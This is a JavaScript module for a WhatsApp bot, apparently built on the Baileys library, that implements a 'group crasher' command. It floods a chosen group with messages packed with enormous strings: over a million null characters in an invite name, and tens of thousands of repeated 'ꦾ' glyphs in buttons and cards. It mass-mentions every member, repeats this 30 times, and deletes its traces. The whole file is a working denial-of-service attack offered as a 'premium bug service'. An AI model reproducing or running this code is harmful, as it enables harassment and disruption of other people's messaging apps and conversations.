import crypto from 'crypto';
import channelSender from '../commands/channelSender.js';

// Configuration for group bug
const BUG_CONFIG = {
    ITERATIONS: 30,
    COOLDOWN: 2000,
    MAX_RETRIES: 3,
    MENTION_LIMIT: 50,
    VIRUS_LENGTH: 25000
};

async function bug1(message, client, target) {
    const remoteJid = target;
    
    await client.sendMessage(remoteJid, 
           {
              adminInvite: {
                       jid: `120363422552152940@newsletter`,
                       name: "⚡ MICKKING CRASHER ⚡" + "\u0000".repeat(1020000),  
                       caption: "Premium Group Bug Service", // Additional information

                       expiration: Date.now() + 1814400000, // Expiration time in seconds (example: 86400 for 24 hours)

               },
          }
      )

    }

async function clear(message, client){

    const remoteJid = message.key.remoteJid;

    await client.chatModify({

        delete: true,

        lastMessages: [
            {
                key: message.key,

                messageTimestamp: message.messageTimestamp
            }
        ]
    },

    remoteJid

)}

async function bug2(message, client, target) {

  const remoteJid = target;

  const groupMetadata= await client.groupMetadata(target);

  const participants = groupMetadata.participants.map(user => user.id);

  await client.sendMessage(

    remoteJid,
    {
      image: { url: "https://i.ibb.co/ZX5FbQr/MICKKING.jpg" },
      caption: "⚡ MICKKING GROUP BUG ⚡",
      footer: "💫 Premium Group Crasher 💫",

      media: true,

      interactiveButtons: [

        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `🌹 ${"ꦾ".repeat(29000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Je t'aime ${"ꦾ".repeat(29000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `Te amo ${"ꦾ".repeat(29000)}\n\n`,
            url: "https://example.com"
          })
        },

      ]
    },
    {
      quoted: message,
       mentions: participants
    },

    

  );
}


async function bug3(message, client, target) {

  const remoteJid = target;

  const virus = "ꦾ".repeat(BUG_CONFIG.VIRUS_LENGTH);

  const lastBug = await client.sendMessage(
    remoteJid,
    {
        text: "⚡ MICKKING GROUP CRASHER ⚡",
        footer: "💫 Premium Bug Service 💫",

        cards: [

           {
              image: { url: '4.png' }, // or buffer,

              title: '✘ Dev Senku Crasher ✘',

              caption: 'Just another dev on the internet',

              footer: "🌹 🌹",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           },
           {
              image: { url: '4.png' }, // or buffer,

              title: '✘ Dev Senku Crasher ✘',

              caption: 'Just another dev on the internet',

              footer: "🌹 🌹",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           },
           {
              image: { url: '4.png' }, // or buffer,

              title: '✘ Dev Senku Crasher ✘',

              caption: 'Just another dev on the internet',

              footer: "🌹 🌹",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           }

        ]
    },

    { quoted : message }
)   

  return lastBug;


}

async function gcbug(message, client) {
    try {
        const remoteJid = message.key.remoteJid;
        let target;
        let groupName;

        // Send initial status message
        const statusMsg = await client.sendMessage(remoteJid, {
            text: `━━━━『 *MICKKING GROUP BUG* 』━━━━\n\n` +
                 `⚡ *Status:* Initializing...\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `_Preparing group bug service..._`,
            contextInfo: {
                externalAdReply: {
                    title: "MICKKING Bug Service",
                    body: "Premium Group Bug",
                    showAdAttribution: true,
                    renderLargerThumbnail: true
                }
            }
        });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
        const commandAndArgs = messageBody.slice(1).trim();
        const parts = commandAndArgs.split(/\s+/);
        const args = parts.slice(1);

    if (args.length > 0) {

            if (args[0].endsWith("@g.us")) {

                await client.sendMessage(remoteJid, {

                    text: `> _*Attempting to bug the group.....*_`,

                    quoted: message
                })

                target = args[0];

            } else{

                await client.sendMessage(remoteJid, {

                    text: `> _*${args} is not a valid group id, use .gcid to get group id and copy it. Make sure it end's with @g.us*_`,

                    quoted: message
                })
            }



    } else{

            if (remoteJid.endsWith("@g.us")) {

               
                target = remoteJid;

            } else {

                await client.sendMessage(remoteJid, {

                    text: `> _*This is not a group chat, use the bug in a group chat or bug by specifying the group id.*_`,

                    quoted: message
                })

                return;

            }
        }

        // Get target group metadata
        try {
            const groupMetadata = await client.groupMetadata(target);
            groupName = groupMetadata.subject;
        } catch (err) {
            groupName = "Unknown Group";
        }

        // Progress tracking
        let successCount = 0;
        let failCount = 0;

        // Update status message
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *TARGET ACQUIRED* 』━━━━\n\n` +
                 `🎯 *Group:* ${groupName}\n` +
                 `🆔 *ID:* ${target}\n` +
                 `⚡ *Bugs:* ${BUG_CONFIG.ITERATIONS}\n\n` +
                 `_Starting bug deployment..._`
        });

        for (let i = 0; i < BUG_CONFIG.ITERATIONS; i++) {
            try {
                // Show progress every 5 iterations
                if (i % 5 === 0) {
                    await client.sendMessage(remoteJid, {
                        text: `*Progress Update:*\n` +
                             `✅ Sent: ${i}/${BUG_CONFIG.ITERATIONS}\n` +
                             `📊 Success Rate: ${((successCount/(i||1))*100).toFixed(1)}%\n` +
                             `⏳ Estimated Time: ${((BUG_CONFIG.ITERATIONS-i)*2)} seconds`
                    });
                }

                // Rotate between different bug types
                await bug2(message, client, target);
                await bug3(message, client, target);
                const msg = await bug3(message, client, target);
                await clear(msg, client);

                successCount++;
                await new Promise(resolve => setTimeout(resolve, BUG_CONFIG.COOLDOWN));
            } catch (iterError) {
                console.error(`Bug iteration ${i + 1} failed:`, iterError);
                failCount++;
                continue;
            }
        }

        // Send final report
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *OPERATION COMPLETE* 』━━━━\n\n` +
                 `🎯 *Target Group:* ${groupName}\n` +
                 `✅ *Success:* ${successCount}\n` +
                 `❌ *Failed:* ${failCount}\n` +
                 `📊 *Success Rate:* ${((successCount/BUG_CONFIG.ITERATIONS)*100).toFixed(1)}%\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `━━『 *MICKKING BUG SERVICE* 』━━`,
            contextInfo: {
                externalAdReply: {
                    title: "Group Bug Complete",
                    body: `Success Rate: ${((successCount/BUG_CONFIG.ITERATIONS)*100).toFixed(1)}%`,
                    showAdAttribution: true
                }
            }
        });

    } catch (error) {
        console.error("Group bug error:", error);
        
        // Send error message
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *ERROR REPORT* 』━━━━\n\n` +
                 `❌ *Operation Failed*\n` +
                 `⚠️ *Error:* ${error.message}\n` +
                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                 `_Please try again in a few minutes..._`,
            contextInfo: {
                externalAdReply: {
                    title: "Group Bug Service",
                    body: "Error Notification",
                    showAdAttribution: true
                }
            }
        });
    }
}

export default gcbug;
